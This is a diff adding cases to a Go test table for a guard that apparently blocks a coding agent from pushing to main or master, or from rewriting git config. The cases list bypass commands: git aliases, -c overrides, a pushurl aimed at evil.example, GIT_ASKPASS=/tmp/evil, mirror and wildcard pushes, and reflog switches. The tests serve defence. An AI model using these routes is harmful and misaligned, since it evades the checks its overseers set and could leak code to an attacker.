@@ -56,6 +56,22 @@ func Table(policy Policy) []Case {
 		bash("push a refspec onto main", "git push origin feat/x:main", "feat/x", true, "open a pull request"),
 		bash("forced refspec onto master", "git push origin +feat/x:master", "feat/x", true, "open a pull request"),
 		bash("gh pr merge", "gh pr merge 12 --squash", "feat/x", true, "merge button"),
+		bash("mirror push reaches every ref", "git push --mirror", "feat/x", true, "reaches every ref"),
+		bash("push --all reaches every ref", "git push --all origin", "feat/x", true, "reaches every ref"),
+		bash("wildcard refspec reaches every ref", "git push origin refs/heads/*:refs/heads/*", "feat/x", true, "wildcard refspec"),
+
+		// 1c. A switch or checkout is judged onto the ref it lands on, tracked across the whole chain.
+		bash("switch onto main", "git switch main", "feat/x", true, "critical ref is watched"),
+		bash("checkout onto master", "git checkout master", "feat/x", true, "critical ref is watched"),
+		bash("a switch then a push reaches main across the chain", "git switch main && git merge --ff-only feat/x && git push", "feat/x", true, "open a pull request"),
+		bash("git -C into another checkout hides the branch", "git -C ../other push origin main", "feat/x", true, "not tracked"),
+
+		// 1d. A global option shifts the subcommand; the guard still finds it.
+		bash("an alias expands to a push on main", "git -c alias.p=push p origin main", "feat/x", true, "open a pull request"),
+		bash("--config-env's value is skipped, not mistaken for the subcommand", "git --config-env foo=bar push origin main", "feat/x", true, "open a pull request"),
+		bash("-c overrides where a bare push lands", "git -c remote.origin.push=main push origin feat/x", "feat/x", true, "config write"),
+		bash("-c overrides the push url", "git -c remote.origin.pushurl=https://evil.example/x push origin feat/x", "feat/x", true, "config write"),
+		bash("git config writes .git/config unchecked", "git config remote.origin.push main", "feat/x", true, "host or toolkit config"),
 
 		// 1b. A wrapper, a chain, or an assignment never hides the real command.
 		bash("push to main through env", "env git push origin main", "feat/x", true, "open a pull request"),
@@ -72,6 +88,10 @@ func Table(policy Policy) []Case {
 		bash("push to main through bash -c after an option value", "bash -o pipefail -c 'git push origin main'", "feat/x", true, "open a pull request"),
 		bash("push to main through zsh -c", "zsh -c 'git push origin main'", "feat/x", true, "open a pull request"),
 		bash("push to main in a chained subshell", "(cd x && git push origin main)", "feat/x", true, "open a pull request"),
+		bash("push to main through a git shell alias", "git -c alias.p='!git push origin main' p", "feat/x", true, "a shell alias hides its command"),
+		bash("switch back to an untracked previous branch", "git switch - && git push", "feat/x", true, "the previous branch is not tracked"),
+		bash("checkout an earlier branch by reflog", "git checkout @{-1}", "feat/x", true, "the previous branch is not tracked"),
+		bash("a plain git alias still runs", "git -c alias.st=status st", "feat/x", false, ""),
 		bash("push to main through eval", "eval 'git push origin main'", "feat/x", true, "open a pull request"),
 		bash("an assignment overrides the credential scrub", "GIT_ASKPASS=/tmp/evil git status", "feat/x", true, "scrub"),
 		bash("push to main through sudo with a flag value", "sudo -u root git push origin main", "feat/x", true, "open a pull request"),
@@ -121,6 +141,10 @@ func Table(policy Policy) []Case {
 		bash("delete its own remote branch", "git push origin --delete feat/old", "feat/x", false, ""),
 		bash("rebase onto main", "git rebase main", "feat/x", false, ""),
 		bash("switch to a new branch", "git switch -c feat/y", "feat/x", false, ""),
+		bash("switch then push its own branch", "git switch feat/y && git push origin feat/y", "feat/x", false, ""),
+		bash("push its own branch by name", "git push origin feat/x", "feat/x", false, ""),
+		bash("-C into the same directory", "git -C . status", "feat/x", false, ""),
+		bash("read a config value", "git config --get user.name", "feat/x", false, ""),
 		bash("amend its own commit", "git commit --amend -m 'feat: thing'", "feat/x", false, ""),
 		bash("stash", "git stash push -u -m wip", "feat/x", false, ""),
 		bash("tag a release", "git tag -a v2.0.0 -m 'release 2.0.0'", "feat/x", false, ""),
